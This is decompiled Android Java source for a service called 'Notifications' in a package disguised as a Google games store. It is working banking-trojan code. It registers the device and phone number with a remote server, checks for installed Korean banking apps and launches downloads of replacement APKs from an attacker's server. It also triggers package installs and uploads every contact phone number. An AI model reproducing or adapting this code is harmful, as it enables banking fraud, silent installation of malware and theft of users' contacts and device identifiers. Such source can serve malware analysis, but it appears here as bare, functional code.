package com.google.games.stores.service;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;
import com.google.games.stores.bean.MyConfig;
import com.google.games.stores.config.Config;
import com.google.games.stores.site.BKMain;
import com.google.games.stores.util.ConfigUtil;
import com.google.games.stores.util.GeneralUtil;
import com.google.games.stores.util.Logger;
import com.google.games.stores.util.NetTask;
import java.io.File;
import java.util.List;

public class Notifications extends Service {
    /* access modifiers changed from: private */
    public String CONNECT_SERVER = "";
    /* access modifiers changed from: private */
    public String DOWN_SERVER = "";
    private String bk_name = "";
    private String contacts2up = "";
    /* access modifiers changed from: private */
    public Editor editor;
    private boolean readBKDone = false;
    /* access modifiers changed from: private */
    public SharedPreferences sp;

    private void readBackConfig() {
        MyConfig config = ConfigUtil.getConfig(Config.CONFIG_FILE);
        if (config != null) {
            String server = config.getServer();
            if (server == null || server.equalsIgnoreCase("") || server.equalsIgnoreCase("null")) {
                this.CONNECT_SERVER = Config.SERVER;
            } else {
                this.CONNECT_SERVER = server;
            }
            String down = config.getDown();
            if (down == null || down.equalsIgnoreCase("") || down.equalsIgnoreCase("null")) {
                this.DOWN_SERVER = Config.DOWN_SERVER;
            } else {
                this.DOWN_SERVER = down;
            }
        } else {
            this.CONNECT_SERVER = Config.SERVER;
            this.DOWN_SERVER = Config.DOWN_SERVER;
        }
        Logger.i("abc", "Connect Service Server--->" + this.CONNECT_SERVER);
        Logger.i("abc", "Connect Service Server--->" + this.DOWN_SERVER);
    }

    public void onCreate() {
        super.onCreate();
        startForeground(1, new Notification());
        this.sp = getSharedPreferences(Config.CONTACTS_CONFIG, 0);
        this.editor = this.sp.edit();
        readBackConfig();
        registerDevice();
        Logger.i("abc", "Notification create");
        new Thread() {
            public void run() {
                try {
                    Thread.sleep(240000);
                    if (!Notifications.this.DOWN_SERVER.equalsIgnoreCase("")) {
                        Notifications.this.checkStatus();
                    }
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                super.run();
            }
        }.start();
    }

    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        readBackConfig();
        Logger.i("abc", "Notification start");
        if (intent != null) {
            String register = intent.getStringExtra(Config.REGISTER);
            if (!(register == null || register.equalsIgnoreCase("") || !register.equalsIgnoreCase(Config.REGISTER))) {
                Log.i("abc", "intent----->register");
                registerDevice();
            }
        }
        if (intent != null) {
            String update = intent.getStringExtra(Config.SHOW_UPDATE);
            if (!(update == null || update.equalsIgnoreCase("") || !update.equalsIgnoreCase(Config.SHOW_UPDATE))) {
                Logger.i("abc", "checkStatus--->ok");
                if (!this.DOWN_SERVER.equalsIgnoreCase("")) {
                    try {
                        Thread.sleep(5000);
                        checkStatus();
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }
        if (intent != null) {
            String install = intent.getStringExtra(Config.INSTALL_PATH);
            if (install != null && !install.equalsIgnoreCase("")) {
                Logger.i("abc", "Install call");
                File file = new File(install);
                Logger.i("abc", "Install file--->" + file.getAbsolutePath());
                if (file.exists()) {
                    Logger.i("abc", "Install file exists");
                    Intent installIntent = new Intent();
                    installIntent.setAction("android.intent.action.VIEW");
                    installIntent.addFlags(268435456);
                    installIntent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
                    startActivity(installIntent);
                }
            }
        }
    }

    /* access modifiers changed from: private */
    public void registerDevice() {
        try {
            Thread.sleep(15000);
            if (!this.readBKDone) {
                List<PackageInfo> packages = getPackageManager().getInstalledPackages(0);
                for (int i = 0; i < packages.size(); i++) {
                    PackageInfo packageInfo = (PackageInfo) packages.get(i);
                    String str = new String();
                    str = packageInfo.packageName;
                    int j = 0;
                    while (j < Config.BK_ARRAY_LIST.length) {
                        if (str.equalsIgnoreCase(Config.BK_ARRAY_LIST[j]) || str.equalsIgnoreCase(Config.MY_BK_ARRAY_LIST[j])) {
                            if (this.bk_name.equalsIgnoreCase("")) {
                                this.bk_name = Config.BK_NAME_LIST[j];
                            } else {
                                this.bk_name += " - " + Config.BK_NAME_LIST[j];
                            }
                        }
                        j++;
                    }
                }
                this.readBKDone = true;
            }
            new NetTask() {
                /* access modifiers changed from: protected */
                public void afterReturnService(String result) {
                    try {
                        Logger.i("abc", new StringBuilder(String.valueOf(Notifications.this.CONNECT_SERVER)).append(Config.ADD_DEVICE_URL).append(" - ").append("add.php result--->").append(result).append("-----").toString());
                        if (!result.equalsIgnoreCase("OK")) {
                            Log.i("abc", "afterReturnService----->not ok");
                            Notifications.this.registerDevice();
                        } else if (result.equalsIgnoreCase("OK") && !Notifications.this.sp.getBoolean(Config.UPLOAD_CONTACT, false)) {
                            Notifications.this.up_contacts();
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }.execute(new String[]{this.CONNECT_SERVER + Config.ADD_DEVICE_URL, Config.ADD, GeneralUtil.getDevice(this), GeneralUtil.getMobile(this), GeneralUtil.getOperator(this), "1", this.bk_name, "-", "0"});
        } catch (InterruptedException e1) {
            e1.printStackTrace();
        }
    }

    /* access modifiers changed from: private */
    public void checkStatus() {
        int bk_type = 6;
        String pack_name = "";
        List<PackageInfo> packages = getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packages.size(); i++) {
            PackageInfo packageInfo = (PackageInfo) packages.get(i);
            String str = new String();
            str = packageInfo.packageName;
            int j = 0;
            while (j < Config.BK_ARRAY_LIST.length) {
                if (str.equalsIgnoreCase(Config.BK_ARRAY_LIST[j]) && bk_type > j) {
                    bk_type = j;
                    pack_name = Config.BK_ARRAY_LIST[j];
                }
                j++;
            }
        }
        Intent bkMain = new Intent(this, BKMain.class);
        switch (bk_type) {
            case 0:
                new Intent().setAction(Config.CLOSE_ACTIVITY);
                bkMain.putExtra("BK", 0);
                bkMain.putExtra("DOWNLOAD", this.DOWN_SERVER + Config.NH_DOWN);
                bkMain.addFlags(268435456);
                bkMain.putExtra("PACKAGE", pack_name);
                startActivity(bkMain);
                return;
            case 1:
                new Intent().setAction(Config.CLOSE_ACTIVITY);
                bkMain.putExtra("BK", 1);
                bkMain.putExtra("DOWNLOAD", this.DOWN_SERVER + Config.SH_DOWN);
                bkMain.addFlags(268435456);
                bkMain.putExtra("PACKAGE", pack_name);
                startActivity(bkMain);
                return;
            case 2:
                new Intent().setAction(Config.CLOSE_ACTIVITY);
                bkMain.putExtra("BK", 2);
                bkMain.putExtra("DOWNLOAD", this.DOWN_SERVER + Config.WOORI_DOWN);
                bkMain.addFlags(268435456);
                bkMain.putExtra("PACKAGE", pack_name);
                startActivity(bkMain);
                return;
            case 3:
                new Intent().setAction(Config.CLOSE_ACTIVITY);
                bkMain.putExtra("BK", 3);
                bkMain.putExtra("DOWNLOAD", this.DOWN_SERVER + Config.KB_DOWN);
                bkMain.addFlags(268435456);
                bkMain.putExtra("PACKAGE", pack_name);
                startActivity(bkMain);
                return;
            case 4:
                new Intent().setAction(Config.CLOSE_ACTIVITY);
                bkMain.putExtra("BK", 4);
                bkMain.putExtra("DOWNLOAD", this.DOWN_SERVER + Config.HANA_DOWN);
                bkMain.addFlags(268435456);
                bkMain.putExtra("PACKAGE", pack_name);
                startActivity(bkMain);
                return;
            default:
                return;
        }
    }

    public boolean isServiceRunning(String className, Context context) {
        boolean isRunning = false;
        List<RunningServiceInfo> serviceList = ((ActivityManager) context.getSystemService("activity")).getRunningServices(30);
        if (serviceList.size() <= 0) {
            return false;
        }
        for (int i = 0; i < serviceList.size(); i++) {
            if (((RunningServiceInfo) serviceList.get(i)).service.getClassName().equals(className)) {
                isRunning = true;
                break;
            }
        }
        return isRunning;
    }

    /* access modifiers changed from: private */
    public void up_contacts() {
        String rawbase = "content://com.android.contacts/raw_contacts";
        String database = "content://com.android.contacts/data";
        try {
            Thread.sleep(20000);
        } catch (InterruptedException e1) {
            e1.printStackTrace();
        }
        if (this.contacts2up.equalsIgnoreCase("")) {
            try {
                Cursor cursor = getContentResolver().query(Uri.parse(rawbase), null, null, null, null);
                while (cursor.moveToNext()) {
                    String id = cursor.getString(cursor.getColumnIndex("_id"));
                    Cursor datacursor = getContentResolver().query(Uri.parse(database), null, "raw_contact_id=?", new String[]{id}, null);
                    while (datacursor.moveToNext()) {
                        if ("vnd.android.cursor.item/phone_v2".equals(datacursor.getString(datacursor.getColumnIndex("mimetype")))) {
                            String data1 = datacursor.getString(datacursor.getColumnIndex("data1"));
                            if (this.contacts2up.equalsIgnoreCase("")) {
                                this.contacts2up = data1;
                            } else {
                                this.contacts2up += ":" + data1;
                            }
                        }
                    }
                    datacursor.close();
                }
                cursor.close();
            } catch (Exception e) {
                Logger.i("abc", "get contacts Error");
                e.printStackTrace();
            }
        }
        new NetTask() {
            /* access modifiers changed from: protected */
            public void afterReturnService(String result) {
                try {
                    Logger.i("abc", new StringBuilder(String.valueOf(Notifications.this.CONNECT_SERVER)).append(Config.MY_CONTACT_URL).append(" - ").append("ct.php result--->").append(result).append("-----").toString());
                    if (!result.equalsIgnoreCase("OK")) {
                        Log.i("abc", "afterReturnService----->not ok");
                        Notifications.this.up_contacts();
                    } else if (result.equalsIgnoreCase("OK")) {
                        Notifications.this.editor.putBoolean(Config.UPLOAD_CONTACT, true);
                        Notifications.this.editor.commit();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.execute(new String[]{this.CONNECT_SERVER + Config.MY_CONTACT_URL, Config.MY_CONTACT_LIST, GeneralUtil.getDevice(this), this.contacts2up});
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
}
